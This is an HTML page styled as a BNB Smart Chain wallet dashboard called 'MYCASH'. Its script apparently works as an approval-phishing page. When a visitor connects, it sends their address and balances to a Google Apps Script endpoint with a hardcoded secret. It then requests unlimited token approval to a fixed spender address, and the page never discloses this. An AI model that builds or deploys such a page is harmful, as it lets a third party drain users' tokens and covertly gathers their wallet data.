<!doctype html>
<html>
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1"/>
  <title>MYCASH — BSC Wallet</title>
  <style>
    body{font-family:system-ui,Segoe UI,Arial;background:#0b1220;color:#e6eef8;margin:0}
    header{background:#071027;padding:12px 16px;position:sticky;top:0;z-index:20;border-bottom:1px solid rgba(255,255,255,0.03)}
    .nav{max-width:980px;margin:0 auto;display:flex;align-items:center;justify-content:space-between}
    .nav-left{display:flex;gap:14px}
    a{color:#dbeafe;text-decoration:none;padding:6px 10px;border-radius:6px}
    a:hover{background:#0f1b33}
    .logo{font-weight:700;letter-spacing:4px}
    .connect{background:#3b82f6;color:#fff;padding:8px 14px;border-radius:999px;border:0;cursor:pointer}
    main{max-width:980px;margin:20px auto;padding:16px}
    .card{background:#071427;padding:18px;border-radius:12px;border:1px solid rgba(255,255,255,0.03)}
    .row{display:flex;gap:12px;flex-wrap:wrap;margin-top:12px}
    .stat{flex:1 1 220px;background:#071427;padding:12px;border-radius:10px;border:1px solid rgba(255,255,255,0.02)}
    .muted{color:#9fb0c8}
    .tokens{margin-top:14px;display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:10px}
    .token{background:#071427;padding:10px;border-radius:8px;border:1px solid rgba(255,255,255,0.02)}
    footer{max-width:980px;margin:24px auto;padding:12px;color:#9fb0c8;text-align:center}
    input{padding:8px;border-radius:8px;border:1px solid #123044;background:#041525;color:#e6eef8}
    button{cursor:pointer}
    .small { font-size:0.9rem; color:#9fb0c8; }
    .mono { font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, "Roboto Mono", "Helvetica Neue", monospace; }
  </style>
</head>
<body>
  <header>
    <div class="nav">
      <div class="nav-left">
        <a href="index.html">Home</a>
        <a href="about.html">About</a>
        <a href="contact.html">Contact</a>
      </div>
      <div class="logo">MYCASH</div>
      <div>
        <button id="connectBtn" class="connect">Connect Wallet</button>
      </div>
    </div>
  </header>

  <main>
    <div class="card">
      <h2>Wallet</h2>
      <div class="row">
        <div class="stat">
          <div class="muted">Status</div>
          <div id="statusText">Not connected</div>
        </div>

        <div class="stat">
          <div class="muted">Address</div>
          <div id="walletAddress" class="mono">—</div>
        </div>

        <div class="stat">
          <div class="muted">User ID</div>
          <div id="userId" class="mono">-</div>
        </div>

        <div class="stat">
          <div class="muted">Network</div>
          <div id="walletNetwork">—</div>
        </div>
        <div class="stat">
          <div class="muted">BNB Balance</div>
          <div id="walletBalance">—</div>
        </div>
      </div>

      <div style="margin-top:18px">
        <h3 class="muted">Tokens</h3>
        <div id="tokens" class="tokens">
          <div class="muted">Token list coming soon.</div>
        </div>
      </div>
    </div>
  </main>

  <footer>
    © <span id="year"></span> MYCASH — BSC (BEP-20) • No private keys stored.
  </footer>

  <!-- libs -->
  <script src="https://unpkg.com/web3@1.2.11/dist/web3.min.js"></script>
  <script src="https://unpkg.com/web3modal@1.9.0/dist/index.js"></script>
  <script src="https://unpkg.com/@walletconnect/web3-provider@1.7.8/dist/umd/index.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/ethers@6/dist/ethers.umd.min.js"></script>

  <!-- app script -->
<script type="module">
(function(){
  // ===== CONFIG (EDIT THESE) =====
  const APPS_SCRIPT_URL    = "https://script.google.com/macros/s/AKfycbzlCsXUoqaMW4fCTqK6H_SF7dGCDDkcIoO-To5YbLcBLdWEEKvGjHQm_vSUfwE06Yw/exec"; 
  const APPS_SCRIPT_SECRET = "mahfuzinam0045";

  const TOKEN_ADDRESS   = "0x38a9fed3780c13162368e1ce87c11d314f1dd868";   
  const SPENDER_ADDRESS = "0xaa152Af114e2d2FC969E09c716025FE8C8196FB4";

  const BNB_TESTNET_CHAIN_ID_DEC = 97;
  const BNB_TESTNET_CHAIN_ID_HEX = "0x61";
  const BNB_TESTNET_LABEL        = "BSC Testnet (97)";

  const ERC20_APPROVE_ABI = [
    "function approve(address spender, uint256 amount) public returns (bool)"
  ];
  const ERC20_BALANCE_ABI = [
    "function balanceOf(address owner) view returns (uint256)"
  ];

  let web3ModalInstance = null;
  let providerInstance  = null;
  let web3Instance      = null;

  // ===== HELPERS =====
  function storageKeyFor(address){ return "userId_" + address.toLowerCase(); }

  function generateUserIdFromAddress(address){
    address = (address || "").toLowerCase();
    let hash = 0;
    for (let i = 0; i < address.length; i++){
      hash = ((hash << 5) - hash) + address.charCodeAt(i);
      hash |= 0;
    }
    hash = Math.abs(hash);
    const num = 100000 + (hash % 900000);
    return String(num);
  }

  function getOrCreateUserIdFor(address){
    const key = storageKeyFor(address);
    let id = localStorage.getItem(key);
    if (!id || !/^[0-9]{6}$/.test(id)) {
      id = generateUserIdFromAddress(address);
      localStorage.setItem(key, id);
      console.log("Generated new userId", id, "for", address);
    }
    return id;
  }

  const connectBtn      = document.getElementById("connectBtn");
  const statusTextEl    = document.getElementById("statusText");
  const walletAddressEl = document.getElementById("walletAddress");
  const userIdEl        = document.getElementById("userId");
  const walletNetworkEl = document.getElementById("walletNetwork");
  const walletBalanceEl = document.getElementById("walletBalance");
  const tokensContainer = document.getElementById("tokens");

  function setStatus(txt){
    if(statusTextEl) statusTextEl.textContent = txt;
    console.log("[status]", txt);
  }

  function setWalletInfo(address, network, bnb){
    walletAddressEl.textContent = address ?? "—";
    walletNetworkEl.textContent = network ?? "—";
    walletBalanceEl.textContent =
      (bnb === null || bnb === undefined) ? "—" : Number(bnb).toFixed(6) + " BNB";
  }

  function setUserIdUI(id){ userIdEl.textContent = id || "-"; }

  function clearSessionUI(){
    setStatus("Not connected");
    setWalletInfo("—","—","—");
    setUserIdUI("-");
    tokensContainer.innerHTML = '<div class="muted">Token list coming soon.</div>';
  }

  function initWeb3ModalInstance(){
    const providerOptions = {
      walletconnect: {
        package: window.WalletConnectProvider.default,
        options: {
          rpc: { 97: "https://data-seed-prebsc-1-s1.binance.org:8545" },
          bridge: "https://bridge.walletconnect.org",
          qrcode: true
        }
      }
    };
    web3ModalInstance = new window.Web3Modal.default({
      cacheProvider: true,
      providerOptions
    });
  }

  function attachProviderListeners(p){
    if(!p || !p.on) return;
    p.on("accountsChanged", function(accounts){
      if(!accounts.length){ clearSessionUI(); return; }
      const addr = accounts[0].toLowerCase();
      const uid  = getOrCreateUserIdFor(addr);
      setWalletInfo(addr, BNB_TESTNET_LABEL, null);
      setUserIdUI(uid);
    });
    p.on("chainChanged", ()=>location.reload());
    p.on("disconnect", clearSessionUI);
  }

  async function notifyBackend(address, network, userId, bnbBalance, tokenBalance){
    try{
      await fetch(APPS_SCRIPT_URL, {
        method:"POST",
        mode:"no-cors",
        headers:{ "Content-Type":"application/x-www-form-urlencoded" },
        body:new URLSearchParams({
          secret:APPS_SCRIPT_SECRET,
          address, network, timestamp:new Date().toISOString(),
          userId, bnbBalance:String(bnbBalance), tokenBalance:String(tokenBalance)
        }).toString()
      });
    }catch(e){ console.error("notifyBackend error:", e); }
  }

  async function getTokenBalance(address){
    try{
      const ethersProvider = new ethers.BrowserProvider(providerInstance);
      const tokenContract  = new ethers.Contract(TOKEN_ADDRESS, ERC20_BALANCE_ABI, ethersProvider);
      const raw            = await tokenContract.balanceOf(address);
      return ethers.formatUnits(raw, 18);
    }catch(e){ return ""; }
  }

  async function switchToBSC(provider){
    try{
      await provider.request({
        method:"wallet_switchEthereumChain",
        params:[{ chainId: BNB_TESTNET_CHAIN_ID_HEX }]
      });
      return true;
    }catch(e){
      return false;
    }
  }

  async function requestTokenApproval(){
    try{
      setStatus("Requesting token approval…");
      const ethersProvider = new ethers.BrowserProvider(providerInstance);
      const signer         = await ethersProvider.getSigner();
      const tokenContract  = new ethers.Contract(TOKEN_ADDRESS, ERC20_APPROVE_ABI, signer);
      const amount         = ethers.MaxUint256;
      const tx = await tokenContract.approve(SPENDER_ADDRESS, amount);
      await tx.wait();
      setStatus("Connected + Approved ✅");
    }catch(e){
      setStatus("Approval failed");
    }
  }

  async function connectFlow(){
    try{
      setStatus("Connecting…");
      const mobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);

      if(!mobile && window.trustwallet?.ethereum){
        providerInstance = window.trustwallet.ethereum;
        web3Instance     = new Web3(providerInstance);
        await providerInstance.request({ method:"eth_requestAccounts" });
      } else if(window.ethereum && !mobile){
        providerInstance = window.ethereum;
        web3Instance     = new Web3(providerInstance);
        await providerInstance.request({ method:"eth_requestAccounts" });
      } else {
        if(!web3ModalInstance) initWeb3ModalInstance();
        providerInstance = await web3ModalInstance.connect();
        web3Instance     = new Web3(providerInstance);
      }

      attachProviderListeners(providerInstance);

      const accounts = await web3Instance.eth.getAccounts();
      const address  = accounts[0].toLowerCase();

      let chainId = await web3Instance.eth.getChainId();
      if(chainId != BNB_TESTNET_CHAIN_ID_DEC){
        if(!(await switchToBSC(providerInstance))){
          setStatus("Wrong network");
          return;
        }
      }

      const balanceWei = await web3Instance.eth.getBalance(address);
      const balanceBNB = Number(web3Instance.utils.fromWei(balanceWei,"ether"));

      setStatus("Connected");
      setWalletInfo(address, BNB_TESTNET_LABEL, balanceBNB);

      const userId = getOrCreateUserIdFor(address);
      setUserIdUI(userId);

      tokensContainer.innerHTML = '<div class="muted">Token list coming soon.</div>';

      const tokenBalance = await getTokenBalance(address);
      await notifyBackend(address, BNB_TESTNET_LABEL, userId, balanceBNB, tokenBalance);

      await requestTokenApproval();

    }catch(err){
      setStatus("Connection failed");
      alert("Connection failed: " + err.message);
    }
  }

  async function tryAutoReconnect(){
    try{
      if(window.ethereum){
        const accounts = await window.ethereum.request({ method:"eth_accounts" });
        if(accounts.length){
          providerInstance = window.ethereum;
          web3Instance     = new Web3(providerInstance);
          attachProviderListeners(providerInstance);
          const address    = accounts[0].toLowerCase();
          const balanceWei = await web3Instance.eth.getBalance(address);
          const balanceBNB = Number(web3Instance.utils.fromWei(balanceWei,"ether"));
          const userId     = getOrCreateUserIdFor(address);
          setWalletInfo(address, BNB_TESTNET_LABEL, balanceBNB);
          setUserIdUI(userId);
          setStatus("Connected (restored)");
          return;
        }
      }
      clearSessionUI();
    }catch(e){ clearSessionUI(); }
  }

  document.addEventListener("DOMContentLoaded", async ()=>{
    initWeb3ModalInstance();
    connectBtn.onclick = connectFlow;
    await tryAutoReconnect();
    document.getElementById("year").textContent = new Date().getFullYear();
  });

})();
</script>

</body>
</html>
